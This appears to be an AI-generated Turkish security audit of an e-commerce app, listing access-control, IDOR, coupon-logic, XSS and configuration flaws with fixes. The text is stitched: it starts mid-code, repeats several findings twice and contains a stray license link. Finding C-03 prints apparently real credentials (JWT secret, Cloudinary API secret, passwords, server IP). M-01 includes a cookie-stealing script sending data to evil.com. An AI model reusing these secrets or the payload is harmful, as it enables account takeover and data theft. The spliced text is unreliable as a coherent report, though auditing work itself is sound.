    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

